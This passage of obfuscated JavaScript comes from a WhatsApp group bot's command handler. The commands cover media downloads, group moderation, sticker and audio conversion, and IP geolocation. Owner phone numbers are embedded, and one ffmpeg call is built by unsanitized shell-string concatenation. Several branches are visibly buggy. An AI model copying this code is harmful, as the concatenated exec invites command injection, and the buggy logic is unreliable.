        {
          if (!_0x32d59b) {
            return _0x44490c.reply("Use :\n> .fb link");
          }
          if (!/facebook.com/.test(_0x32d59b)) {
            return _0x44490c.reply("Link invalid!");
          }
          _0x44490c.reply(msg.arch);
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '🔽',
              'key': _0x44490c.key
            }
          });
          await _0x213ed6("https://widipe.com/download/fbdown?url=" + _0x32d59b).then(_0x43cbb5 => {
            if (!_0x43cbb5.status) {
              return _0x44490c.reply(JSON.stringify(_0x43cbb5, null, 0x2));
            }
            _0x38cbcb.sendMessage(_0x44490c.chat, {
              'video': {
                'url': '' + (_0x43cbb5.result.url.isHdAvailable == true ? _0x43cbb5.result.url.urls[0x0].hd : _0x43cbb5.result.url.urls[0x0].sd)
              },
              'mimetype': 'video/mp4',
              'caption': "download by arch wa ai 💞"
            }, {
              'quoted': _0x44490c
            });
          })["catch"](_0x5a211d => _0x44490c.reply(_0x5a211d.toString()));
        }
        break;
      case 'tiktok':
      case 'tt':
      case "ttdl":
      case "tiktokdl":
        {
          if (!_0x32d59b) {
            return _0x44490c.reply("use :\n> .tiktok link");
          }
          if (!/tiktok.com/.test(_0x32d59b)) {
            return _0x44490c.reply("Tiktok link invalid");
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '⏫',
              'key': _0x44490c.key
            }
          });
          await _0x57794f();
          await api.tiktok(_0x32d59b).then(async _0x3b53e0 => {
            if (_0x3b53e0.result.duration == 0x0) {
              for (let _0x484f43 of _0x3b53e0.result.images) {
                _0x38cbcb.sendMessage(_0x44490c.chat, {
                  'image': {
                    'url': '' + _0x484f43
                  },
                  'caption': "Tiktok Downloader by Arch Wa Ai  💞"
                }, {
                  'quoted': _0x44490c
                });
              }
            } else {
              await _0x38cbcb.sendMessage(_0x44490c.chat, {
                'video': {
                  'url': _0x3b53e0.result.play
                },
                'mimetype': 'video/mp4',
                'caption': "Tiktok Downloader by Arch Wa Ai  💞"
              }, {
                'quoted': _0x44490c
              });
            }
          })["catch"](_0x1762b3 => _0x44490c.reply('' + _0x1762b3));
        }
        break;
      case 'mediafire':
        {
          if (_0x27283f.length == 0x0) {
            return _0x44490c.reply("Use :\n> .mediafire link");
          }
          if (!_0x27283f[0x0].includes("mediafire.com")) {
            return _0x44490c.reply("The link you provided is invalid");
          }
          await _0x57794f();
          const {
            mediafireDl: _0x3f5883
          } = require("./all/mediafire.js");
          const _0x291c5e = await _0x3f5883(_0x32d59b);
          if (_0x291c5e[0x0].size.split('MB')[0x0] >= 0x2710) {
            return _0x44490c.reply("Oops, the file is too big...");
          }
          const _0x953515 = "*MEDIAFIRE DOWNLOADER*\n\n❖ Name : " + _0x291c5e[0x0].nama + "\n❖ Size : " + _0x291c5e[0x0].size + "\n❖ Mime : " + _0x291c5e[0x0].mime + "\n❖ Link : " + _0x291c5e[0x0].link;
          _0x44490c.reply('' + _0x953515);
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'document': {
              'url': _0x291c5e[0x0].link
            },
            'fileName': _0x291c5e[0x0].nama,
            'mimetype': _0x291c5e[0x0].mime
          }, {
            'quoted': _0x44490c
          });
        }
        break;
      case "git":
      case "gitclone":
        {
          if (!_0x27283f[0x0]) {
            return _0x44490c.reply("use\nEg :" + _0x4b9d86 + _0x259a4d + " link");
          }
          if (!_0x27283f[0x0].includes("github.com")) {
            return _0x44490c.reply("Link invalid!");
          }
          await _0x57794f();
          let _0x4cc7d6 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
          let [, _0x474ead, _0xf6be4d] = _0x27283f[0x0].match(_0x4cc7d6) || [];
          _0xf6be4d = _0xf6be4d.replace(/.git$/, '');
          let _0x338a94 = 'https://api.github.com/repos/' + _0x474ead + '/' + _0xf6be4d + "/zipball";
          let _0x454268 = (await fetch(_0x338a94, {
            'method': "HEAD"
          })).headers.get("content-disposition").match(/attachment; filename=(.*)/)[0x1];
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'document': {
              'url': _0x338a94
            },
            'fileName': _0x454268 + ".zip",
            'mimetype': 'application/zip'
          }, {
            'quoted': _0x44490c
          })["catch"](_0x8522e8 => _0x44490c.reply(msg.error));
        }
        break;
      case "ping":
        {
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '〽️',
              'key': _0x44490c.key
            }
          });
          await _0x57794f();
          const _0x5726b9 = new Date();
          const _0x56b7b2 = await _0x38cbcb.sendMessage(_0x44490c.chat, {
            'text': "𝐑𝐞𝐚𝐝𝐢𝐧𝐠 𝐩𝐢𝐧𝐠 ⫸"
          }, {
            'quoted': _0x44490c
          });
          await _0x38cbcb.relayMessage(_0x44490c.chat, {
            'protocolMessage': {
              'key': _0x56b7b2.key,
              'type': 0xe,
              'editedMessage': {
                'conversation': "Aʀᴄʜ Mᴅ Sᴘᴇᴇᴅ " + (new Date() - _0x5726b9) + " Ms"
              }
            }
          }, {});
        }
        break;
      case "runtime":
        {
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '💨',
              'key': _0x44490c.key
            }
          });
          await _0x57794f();
          let _0xabb0b7 = "Arch wa ai bot has been active for:\n" + _0x35a7b8(process.uptime());
          _0x44490c.reply(_0xabb0b7);
        }
        break;
      case "arch":
      case 'arch-md':
        {
          await _0x57794f();
          const _0x28d7e0 = _0x3745cc();
          const _0x2335dc = _0x3745cc() - _0x28d7e0;
          let _0x40ee11 = "   `𝐀𝐑𝐂𝐇 𝐖𝐀 𝐀𝐈`\n         \n┏━━━━━━━━━━━━━━━━━━\n┃✪ Botname: Arch Wa Ai\n┃✪ Creator: Ednut\n┃✪ Ping: " + _0x2335dc.toFixed(0x4) + "\n┃✪ Time: " + _0x1a630e().split('T')[0x1].split('+')[0x0] + "\n┃✪ uptime: " + _0x35a7b8(process.uptime()) + "\n┗━━━━━━━━━━━━━━━━━\nArch deployment \n> heroku\n> render\n> panel\n> koyeb \n> toystack <etc>\nSupport \n> Channel: https://whatsapp.com/channel/0029VaefL9g0gcfLITSc841W\n> Group: https://chat.whatsapp.com/HO2JGN8YHr9IOf4XOSRhGe\n> owner: wa.me/2347036214381\n© " + global.footer + "\n ";
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '🥇',
              'key': _0x44490c.key
            }
          });
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'text': _0x40ee11,
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': false,
                'title': global.botname,
                'body': global.botowner,
                'thumbnailUrl': "https://i.imgur.com/FbUEmbz.jpeg",
                'sourceUrl': global.linkgc,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x1ffdeb
          });
        }
        break;
      case "bot":
        {
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '😎',
              'key': _0x44490c.key
            }
          });
          await _0x38cbcb.sendMessage(_0x44490c.chat, {
            'audio': {
              'url': "https://nue-api.vercel.app/api/tts?lang=en&text=Ark bot is currently active ️"
            },
            'mimetype': "audio/mpeg",
            'ptt': true
          }, {
            'quoted': _0x44490c
          });
        }
        break;
      case "tag":
      case "hidetag":
      case 'h':
      case "totag":
        {
          if (!_0x5d1680) {
            return _0x44490c.reply(msg.group);
          }
          if (!_0x3ba66b) {
            return _0x44490c.reply(msg.admin);
          }
          if (!_0x44490c.quoted && !_0x32d59b) {
            return _0x44490c.reply("use: .tag \n message or reply to chat");
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '📣',
              'key': _0x44490c.key
            }
          });
          var _0x51885d = _0x44490c.quoted ? _0x44490c.quoted.text : _0x32d59b;
          var _0x2564d2 = await _0x2e028e.participants.map(_0x2a481a => _0x2a481a.id);
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'text': _0x51885d,
            'mentions': [..._0x2564d2]
          });
        }
        break;
      case 'tagall':
        {
          if (!_0x3ba66b) {
            return _0x44490c.reply(msg.admin);
          }
          if (!_0x5d1680) {
            return _0x44490c.reply(msg.group);
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '📢',
              'key': _0x44490c.key
            }
          });
          await _0x57794f();
          let _0x4d071c = " ◊ 👥 Attention everyone 👥 ◊\n ✯ Message : " + (q ? q : "none") + " ✫\n\n";
          for (let _0x579bea of _0x4e4219) {
            _0x4d071c += global.simbol + " @" + _0x579bea.id.split('@')[0x0] + "\n";
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'text': _0x4d071c,
            'mentions': _0x4e4219.map(_0x46d099 => _0x46d099.id)
          }, {
            'quoted': _0x44490c
          });
        }
        break;
      case "tagadmin":
      case 'listadmin':
      case 'admin':
        {
          if (!_0x5d1680) {
            return _0x44490c.reply(msg.group);
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '🗣️',
              'key': _0x44490c.key
            }
          });
          const _0x5afe6c = _0x4e4219.filter(_0x1ac117 => _0x1ac117.admin);
          const _0x1a59dd = _0x5afe6c.map((_0x27f826, _0x9f238a) => _0x9f238a + 0x1 + ". @" + _0x27f826.id.split('@')[0x0]).join("\n");
          const _0x25debc = _0x2e028e.owner || _0x5afe6c.find(_0x5320c0 => _0x5320c0.admin === "superadmin")?.['id'] || _0x44490c.chat.split`-`[0x0] + '@s.whatsapp.net';
          let _0x2998fc = ("   \n◊ Group Admins ◊\n" + global.simbol + " " + _0x1a59dd + "\n").trim();
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'text': _0x2998fc,
            'mentions': [..._0x5afe6c.map(_0x2c117a => _0x2c117a.id), _0x25debc]
          }, {
            'quoted': _0x44490c
          });
        }
        break;
      case "linkgroup":
      case "linkgrp":
      case 'linkgc':
      case 'gclink':
      case "grouplink":
      case 'invite2':
        if (!_0x5d1680) {
          return _0x44490c.reply(msg.group);
        }
        if (!_0x3ba66b && !_0x402f36 && !_0x2084b0) {
          return _0x44490c.reply(msg.admin);
        }
        if (!_0x5c94f1) {
          return _0x44490c.reply("Arch bot must be admin first");
        }
        _0x38cbcb.sendMessage(_0x44490c.chat, {
          'react': {
            'text': '🖇️',
            'key': _0x44490c.key
          }
        });
        let _0x5b8d08 = await _0x38cbcb.groupInviteCode(_0x44490c.chat);
        _0x38cbcb.sendText(_0x44490c.chat, "🦋 Gc link here Name : " + _0x2e028e.subject + "\n👤 Owner Grup : " + (_0x2e028e.owner !== undefined ? '+' + _0x2e028e.owner.split`@`[0x0] : "Not known") + "\n chat link 🖇️: https://chat.whatsapp.com/" + _0x5b8d08 + "\n", _0x44490c, {
          'detectLink': true
        });
        break;
      case "resetlinkgc":
      case "resetlinkgroup":
      case "resetlinkgrup":
      case 'revoke':
      case "resetlink":
      case 'resetgrouplink':
      case 'resetgclink':
      case 'resetgruplink':
        {
          if (!_0x5d1680) {
            return _0x44490c.reply(msg.group);
          }
          if (!_0x5c94f1) {
            return _0x44490c.reply("Arch Bot Must Become Admin First");
          }
          if (!_0x3ba66b && !_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.admin);
          }
        }
        break;
      case 'add':
        {
          if (!_0x5d1680) {
            return _0x44490c.reply(msg.group);
          }
          if (!_0x5c94f1) {
            return _0x44490c.reply("Arch Bot Must Become Admin First");
          }
          if (!_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.owner);
          }
          if (!_0x3ba66b) {
            return _0x44490c.replg(msg.admin);
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '➕',
              'key': _0x44490c.key
            }
          });
          if (!_0x44490c.quoted && !_0x32d59b) {
            return _0x44490c.reply("use: .add \n number/reply chat");
          }
          let _0x3525f3 = _0x44490c.quoted ? _0x44490c.quoted.sender : _0x32d59b.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x38cbcb.groupParticipantsUpdate(_0x44490c.chat, [_0x3525f3], "add");
          await _0x44490c.reply("user added");
        }
        break;
      case "kick":
      case "fling":
      case 'k':
      case "remove":
        {
          if (!_0x5d1680) {
            return _0x44490c.reply(msg.group);
          }
          if (!_0x3ba66b && !_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.admin);
          }
          if (!_0x5c94f1) {
            return _0x44490c.reply("Arch Bot must be admins first");
          }
          if (!_0x44490c.quoted && !_0x32d59b) {
            return _0x44490c.reply("example .kick: \n tag/reply chat");
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '➖',
              'key': _0x44490c.key
            }
          });
          await _0x57794f();
          let _0x4b61b6 = _0x44490c.mentionedJid[0x0] ? _0x44490c.mentionedJid[0x0] : _0x44490c.quoted ? _0x44490c.quoted.sender : _0x32d59b.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x38cbcb.groupParticipantsUpdate(_0x44490c.chat, [_0x4b61b6], "remove");
          await _0x44490c.reply("Bastard @" + _0x44490c.mentionedJid[0x0] + " flinged out");
        }
        break;
      case 'promote':
        {
          if (!_0x5d1680) {
            return _0x44490c.reply(msg.group);
          }
          if (!_0x3ba66b && !IsOwner && !_0x2084b0) {
            return _0x44490c.reply(msg.admin);
          }
          if (!_0x5c94f1) {
            return rm.eply("Arch Bot Must be admin first");
          }
          if (!_0x44490c.quoted && !_0x32d59b) {
            return _0x44490c.reply("example .promote: \n tag/reply chat");
          }
          let _0x3069f5 = _0x44490c.mentionedJid[0x0] ? _0x44490c.mentionedJid[0x0] : _0x44490c.quoted ? _0x44490c.quoted.sender : _0x32d59b.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x38cbcb.groupParticipantsUpdate(_0x44490c.chat, [_0x3069f5], "promote");
          await _0x44490c.reply("User @" + _0x44490c.mentionedJid[0x0] + " has been promoted to an administrator in " + _0x2e028e.subject);
        }
        break;
      case 'demote':
        {
          if (!_0x5d1680) {
            return _0x44490c.reply(msg.owner);
          }
          if (!_0x3ba66b && !_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.admin);
          }
          if (!_0x5c94f1) {
            return _0x44490c.reply("Arch Bot Must be admin first");
          }
          if (!_0x44490c.quoted && !_0x32d59b) {
            return _0x44490c.reply("example .demote: \n tag/reply chat");
          }
          let _0x1ee0de = _0x44490c.mentionedJid[0x0] ? _0x44490c.mentionedJid[0x0] : _0x44490c.quoted ? _0x44490c.quoted.sender : _0x32d59b.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x38cbcb.groupParticipantsUpdate(_0x44490c.chat, [_0x1ee0de], "demote");
          await _0x44490c.reply("user @" + _0x1ee0de + " has been dismissed as an administrator in  " + _0x2e028e.subject);
        }
        break;
      case 'close':
      case "mute":
      case "groupclose":
        {
          if (!_0x5d1680) {
            return _0x44490c.reply(msg.group);
          }
          if (!_0x5c94f1) {
            return _0x44490c.reply("Arch bot must be admin first");
          }
          if (!_0x3ba66b && !_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.admin);
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '🤫',
              'key': _0x44490c.key
            }
          });
          await _0x38cbcb.groupSettingUpdate(_0x44490c.chat, 'announcement');
          _0x44490c.reply("Successfully Changed Group Settings " + _0x2e028e.subject + " to Only Admins Can Send Messages");
        }
        break;
      case "open":
      case "unmute":
      case "groupopen":
        {
          if (!_0x5d1680) {
            return _0x44490c.reply(msg.group);
          }
          if (!_0x5c94f1) {
            return _0x44490c.reply("Arch Bot must be admin first");
          }
          if (!_0x3ba66b && !_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.admin);
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': "🗣️",
              'key': _0x44490c.key
            }
          });
          await _0x38cbcb.groupSettingUpdate(_0x44490c.chat, 'not_announcement');
          _0x44490c.reply("Successfully Changed Group Settings " + _0x2e028e.subject + " to all participant Can Send Messages");
        }
        break;
      case "closetime":
        {
          if (!_0x5d1680) {
            return _0x44490c.reply(msg.group);
          }
          if (!_0x3ba66b && !Owner) {
            return _0x44490c.reply(msg.admin);
          }
          if (!_0x5c94f1) {
            return _0x44490c.reply("Arch bot must be admin first");
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '⌛',
              'key': _0x44490c.key
            }
          });
          if (_0x27283f[0x1] == 'second') {
            var _0x4fb5ec = _0x27283f[0x0] * '1000';
          } else {
            if (_0x27283f[0x1] == "minute") {
              var _0x4fb5ec = _0x27283f[0x0] * "60000";
            } else {
              if (_0x27283f[0x1] == "hour") {
                var _0x4fb5ec = _0x27283f[0x0] * "3600000";
              } else {
                if (_0x27283f[0x1] == 'day') {
                  var _0x4fb5ec = _0x27283f[0x0] * "86400000";
                } else {
                  return _0x44490c.reply("Choose:\nsecond\nminute\nhour\n\nExample\n .closegroup 10 second");
                }
              }
            }
          }
          _0x44490c.reply("Close Time " + q + " Starting from now");
          setTimeout(() => {
            _0x38cbcb.groupSettingUpdate(_0x4e1c1e, "announcement");
            _0x44490c.reply("This group has been closed because it was scheduled on time, Group Closed By ARCH\nNow Only Admins Can Send Messages");
          }, _0x4fb5ec);
        }
        break;
      case "opentime":
        {
          if (!_0x5d1680) {
            return _0x44490c.reply(msg.group);
          }
          if (!_0x3ba66b && !_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.admin);
          }
          if (!_0x5c94f1) {
            return _0x44490c.reply("Arch Bot must be admin first");
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '⏳',
              'key': _0x44490c.key
            }
          });
          if (_0x27283f[0x1] == "second") {
            var _0x4fb5ec = _0x27283f[0x0] * "1000";
          } else {
            if (_0x27283f[0x1] == "minute") {
              var _0x4fb5ec = _0x27283f[0x0] * '60000';
            } else {
              if (_0x27283f[0x1] == "hour") {
                var _0x4fb5ec = _0x27283f[0x0] * "3600000";
              } else {
                if (_0x27283f[0x1] == "day") {
                  var _0x4fb5ec = _0x27283f[0x0] * "86400000";
                } else {
                  return _0x44490c.reply("Choose:\nsecond\nminute\nhour\n\nExample\n10 second");
                }
              }
            }
          }
          _0x44490c.reply("Open Time " + q + " Starting from now");
          setTimeout(() => {
            _0x38cbcb.groupSettingUpdate(_0x4e1c1e, 'not_announcement');
            _0x44490c.reply("On time Group Opened By Arch\n Now all Members Can Send Messages");
          }, _0x4fb5ec);
        }
        break;
      case 'welcome':
        if (!_0x5d1680) {
          return _0x44490c.reply(msg.group);
        }
        if (!_0x3ba66b && !_0x402f36 && !_0x2084b0) {
          return _0x44490c.reply(msg.admin);
        }
        if (_0x27283f[0x0] === 'on') {
          '#welcome';
          _0x44490c.sender;
          _0x335767;
          if (_0x588248) {
            return _0x44490c.reply("Already activated");
          }
          _0x11cbb8.push(_0x44490c.chat);
          fs.writeFileSync("./all/database/welcome.json", JSON.stringify(_0x11cbb8, null, 0x2));
          _0x44490c.reply("succesfully turned on welcome in the group");
        } else {
          if (_0x27283f[0x0] === 'off') {
            '#welcome';
            _0x44490c.sender;
            _0x335767;
            if (!_0x588248) {
              return _0x44490c.reply("already turned off");
            }
            let _0x45be83 = _0x11cbb8.indexOf(_0x44490c.chat);
            _0x11cbb8.splice(_0x45be83, 0x1);
            fs.writeFileSync("./all/database/welcome.json", JSON.stringify(_0x11cbb8, null, 0x2));
            _0x44490c.reply("Successfully disabled welcome in this group");
          } else {
            _0x44490c.reply(_0x4b9d86 + _0x259a4d + " on -- _Activate_\n" + (_0x4b9d86 + _0x259a4d) + " off -- _deactivate_");
          }
        }
        break;
      case "left":
      case "goodbye":
        if (!_0x5d1680) {
          return _0x44490c.reply(msg.group);
        }
        if (!_0x3ba66b && !_0x402f36 && !_0x2084b0) {
          return _0x44490c.reply(msg.admin);
        }
        if (_0x27283f[0x0] === 'on') {
          '#left';
          _0x44490c.sender;
          _0x335767;
          if (_0x44309c) {
            return _0x44490c.reply("Already activated");
          }
          _0x59f8fa.push(_0x44490c.chat);
          fs.writeFileSync('./all/database/left.json', JSON.stringify(_0x59f8fa, null, 0x2));
          _0x44490c.reply("succesfully turned on goodbye in the group");
        } else {
          if (_0x27283f[0x0] === "off") {
            '#left';
            _0x44490c.sender;
            _0x335767;
            if (!_0x44309c) {
              return _0x44490c.reply("Already turned off");
            }
            let _0x1511bf = _0x59f8fa.indexOf(_0x44490c.chat);
            _0x59f8fa.splice(_0x1511bf, 0x1);
            fs.writeFileSync('./all/database/welcome.json', JSON.stringify(_0x59f8fa, null, 0x2));
            _0x44490c.reply("Successfully disabled goodbye in this group");
          } else {
            _0x44490c.reply(_0x4b9d86 + _0x259a4d + " on -- _activate_\n" + (_0x4b9d86 + _0x259a4d) + " off -- _deactivate_");
          }
        }
        break;
      case "sticker":
      case "stiker":
      case 'sgif':
      case 's':
        {
          await _0x57794f();
          if (!/image|video/.test(_0x5a1980)) {
            return _0x44490c.reply("reply to a video/image");
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': "🕹️",
              'key': _0x44490c.key
            }
          });
          if (/video/.test(_0x5a1980)) {
            if (_0x2b7999.seconds > 0xf) {
              return _0x44490c.reply("video duration more than 15 sec!");
            }
          }
          _0x44490c.reply(msg.wait);
          var _0x3b72e5 = await _0x38cbcb.downloadAndSaveMediaMessage(_0x2b7999);
          await _0x38cbcb.sendStimg(_0x44490c.chat, _0x3b72e5, _0x44490c, {
            'packname': global.packname
          });
          await fs.unlinkSync(_0x3b72e5);
        }
        break;
      case "toimage":
      case "toimg":
        {
          await _0x57794f();
          if (!/webp/.test(_0x5a1980) && !/audio/.test(_0x5a1980)) {
            return _0x44490c.reply("reply to a sticker");
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '💦',
              'key': _0x44490c.key
            }
          });
          _0x44490c.reply(msg.wait);
          let _0x2c2a46 = await _0x38cbcb.downloadAndSaveMediaMessage(_0x2b7999);
          let _0x49ca39 = makeid + ".png";
          exec("ffmpeg -i " + _0x2c2a46 + " " + _0x49ca39, _0x9da4f1 => {
            fs.unlinkSync(_0x2c2a46);
            if (_0x9da4f1) {
              return _0x9da4f1;
            }
            let _0x47f874 = fs.readFileSync(_0x49ca39);
            _0x38cbcb.sendMessage(_0x44490c.chat, {
              'image': _0x47f874
            }, {
              'quoted': _0x44490c
            });
            fs.unlinkSync(_0x49ca39);
          });
        }
        break;
      case "toaudio":
      case 'tomp3':
        {
          await _0x57794f();
          if (!/video/.test(_0x5a1980) && !/audio/.test(_0x5a1980)) {
            return _0x44490c.reply("reply to a video");
          }
          if (_0x2b7999.seconds > 0x1e) {
            return _0x44490c.reply("Duration more than 30 sec");
          }
          await _0x57794f();
          await _0x38cbcb.downloadMediaMessage(_0x2b7999).then(async _0x1d984a => {
            let _0x2a18ea = await _0x5c5d49(_0x1d984a, "mp4");
            _0x38cbcb.sendMessage(_0x44490c.chat, {
              'audio': _0x2a18ea,
              'mimetype': "audio/mpeg"
            }, {
              'quoted': _0x44490c
            });
          });
        }
        break;
      case "tovn":
      case "toptt":
        {
          if (!/video|audio/.test(_0x5a1980) && !/audio/.test(_0x5a1980)) {
            return _0x44490c.reply("reply to an audio/video");
          }
          _0x44490c.reply(msg.wait);
          await _0x38cbcb.downloadMediaMessage(_0x2b7999).then(async _0x47d1ff => {
            let _0x51db89 = await _0x3c652a(_0x47d1ff, "mp4");
            _0x38cbcb.sendMessage(_0x44490c.chat, {
              'audio': _0x51db89,
              'mimetype': "audio/mpeg",
              'ptt': true
            }, {
              'quoted': _0x44490c
            });
          });
        }
        break;
      case 'tovv':
      case "toonce":
      case "toviewonce":
        {
          if (!/image|video/.test(_0x5a1980)) {
            return _0x44490c.reply("Reply Image/Video");
          }
          _0x44490c.reply(msg.wait);
          if (/image/.test(_0x5a1980)) {
            anuan = await _0x38cbcb.downloadAndSaveMediaMessage(_0x87515f);
            _0x38cbcb.sendMessage(_0x44490c.chat, {
              'image': {
                'url': anuan
              },
              'caption': "Here he is!!",
              'fileLength': "999",
              'viewOnce': true
            }, {
              'quoted': _0x44490c
            });
          } else if (/video/.test(_0x5a1980)) {
            anuanuan = await _0x38cbcb.downloadAndSaveMediaMessage(_0x87515f);
            _0x38cbcb.sendMessage(_0x44490c.chat, {
              'video': {
                'url': anuanuan
              },
              'caption': "here he is!!",
              'fileLength': "99999999",
              'viewOnce': true
            }, {
              'quoted': _0x44490c
            });
          }
        }
        break;
      case 'tts':
        {
          if (!_0x32d59b) {
            return _0x44490c.reply("eg .tts \n> hello everyone");
          }
          if (_0x32d59b.length >= 0x12c) {
            return _0x44490c.reply("word lenth more than 300!");
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '🤖',
              'key': _0x44490c.key
            }
          });
          _0x44490c.reply(msg.wait);
          try {
            const {
              data: _0x24d1d2
            } = await axios.post('https://tiktok-tts.weilnet.workers.dev/api/generation', {
              'text': _0x32d59b,
              'voice': en
            });
            _0x38cbcb.sendMessage(_0x44490c.chat, {
              'audio': Buffer.from(_0x24d1d2.data, "base64"),
              'mimetype': "audio/mp4"
            }, {
              'quoted': _0x44490c
            });
          } catch (_0x36721b) {
            return _0x44490c.reply(_0x36721b.toString());
          }
        }
        break;
      case "repo":
      case "script":
      case 'sc':
        {
          await _0x57794f();
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '🪀',
              'key': _0x44490c.key
            }
          });
          await axios.get("https://api.github.com/repos/Ednut001/Arch-Md");
          _0x38cbcb.sendMessage(_0x4e1c1e, {
            'image': _0x28640c,
            'caption': "Rᴇᴘᴏsɪᴛᴏʀʏ:- https://github.com/ednut001/Arch-Md\n sᴄᴀɴ:- https://ednut-tech-web.onrender.com \n© 𝓔𝓭𝓷𝓾𝓽"
          }, {
            'quoted': _0x44490c
          });
        }
        break;
      case "getdevice":
      case "device":
      case "phone":
        {
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '📱',
              'key': _0x44490c.key
            }
          });
          _0x38cbcb.reply(_0x44490c.chat, await _0x58862a(_0x44490c.quoted ? _0x44490c.quoted.id : _0x44490c.key.id), _0x44490c);
        }
        break;
      case "owner":
        {
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '️⃣',
              'key': _0x44490c.key
            }
          });
          _0x38cbcb.sendContact(_0x44490c.chat, [owner], "Arch Md Owner", null, {
            'contextInfo': {
              'mentionedJid': [_0x44490c.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnail': await fs.readFileSync("./ednutmedia/ednut2.jpg"),
                'title': " Copyright " + global.botname,
                'renderLargerThumbnail': true,
                'sourceUrl': "https://wa.me/" + global.owner,
                'mediaType': 0x1
              }
            }
          });
        }
        break;
      case "blue":
      case "creator":
        {
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '🌚',
              'key': _0x44490c.key
            }
          });
          _0x38cbcb.sendContact(_0x44490c.chat, ['2347041039367'], "Archxdemon Developer", _0x44490c);
        }
        break;
      case "trackip":
        {
          if (!_0x32d59b) {
            return _0x44490c.reply("Example: " + (_0x4b9d86 + _0x259a4d) + " 112.90.150.204");
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '🪐',
              'key': _0x44490c.key
            }
          });
          await _0x57794f();
          try {
            let _0x100680 = await fetch('https://ipwho.is/' + _0x32d59b).then(_0x2dba21 => _0x2dba21.json());
            if (!_0x100680.success) {
              throw new Error("IP " + _0x32d59b + " not found!");
            }
            await _0x38cbcb.sendMessage(_0x44490c.chat, {
              'location': {
                'degreesLatitude': _0x100680.latitude,
                'degreesLongitude': _0x100680.longitude
              }
            }, {
              'ephemeralExpiration': 0x93a80
            });
            const _0x27d687 = _0x2f0fad => new Promise(_0x4b4958 => setTimeout(_0x4b4958, _0x2f0fad));
            await _0x27d687(0x7d0);
            _0x44490c.reply("\n*IP Information*\n• IP: " + (_0x100680.ip || "N/A") + "\n• Success: " + (_0x100680.success || "N/A") + "\n• Type: " + (_0x100680.type || "N/A") + "\n• Continent: " + (_0x100680.continent || 'N/A') + "\n• Continent Code: " + (_0x100680.continent_code || 'N/A') + "\n• Country: " + (_0x100680.country || "N/A") + "\n• Country Code: " + (_0x100680.country_code || "N/A") + "\n• Region: " + (_0x100680.region || "N/A") + "\n• Region Code: " + (_0x100680.region_code || "N/A") + "\n• City: " + (_0x100680.city || "N/A") + "\n• Latitude: " + (_0x100680.latitude || "N/A") + "\n• Longitude: " + (_0x100680.longitude || "N/A") + "\n• Is EU: " + (_0x100680.is_eu ? "Yes" : 'No') + "\n• Postal: " + (_0x100680.postal || "N/A") + "\n• Calling Code: " + (_0x100680.calling_code || "N/A") + "\n• Capital: " + (_0x100680.capital || 'N/A') + "\n• Borders: " + (_0x100680.borders || "N/A") + "\n• Flag:\n - Image: " + (_0x100680.flag?.['img'] || "N/A") + "\n - Emoji: " + (_0x100680.flag?.["emoji"] || "N/A") + "\n - Emoji Unicode: " + (_0x100680.flag?.['emoji_unicode'] || "N/A") + "\n• Connection:\n - ASN: " + (_0x100680.connection?.["asn"] || "N/A") + "\n - Organization: " + (_0x100680.connection?.['org'] || "N/A") + "\n - ISP: " + (_0x100680.connection?.['isp'] || "N/A") + "\n - Domain: " + (_0x100680.connection?.["domain"] || "N/A") + "\n• Timezone:\n - ID: " + (_0x100680.timezone?.['id'] || "N/A") + "\n - Abbreviation: " + (_0x100680.timezone?.["abbr"] || "N/A") + "\n - Is DST: " + (_0x100680.timezone?.["is_dst"] ? "Yes" : 'No') + "\n - Offset: " + (_0x100680.timezone?.["offset"] || "N/A") + "\n - UTC: " + (_0x100680.timezone?.["utc"] || 'N/A') + 